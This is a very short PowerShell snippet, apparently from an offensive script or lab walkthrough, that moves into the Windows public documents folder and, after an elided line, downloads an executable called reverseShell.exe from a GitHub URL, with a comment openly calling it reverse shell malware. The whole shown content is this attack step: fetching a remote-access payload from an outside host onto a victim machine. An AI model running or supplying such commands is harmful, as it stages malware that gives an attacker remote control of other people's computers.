Set-Location C:\Users\Public\Documents\ #Go to public documents directory
...
Invoke-WebRequest https://github.com/pirateracerx/booty/reverseShell.exe -o reverseShell.exe #Download the reverseShell malware
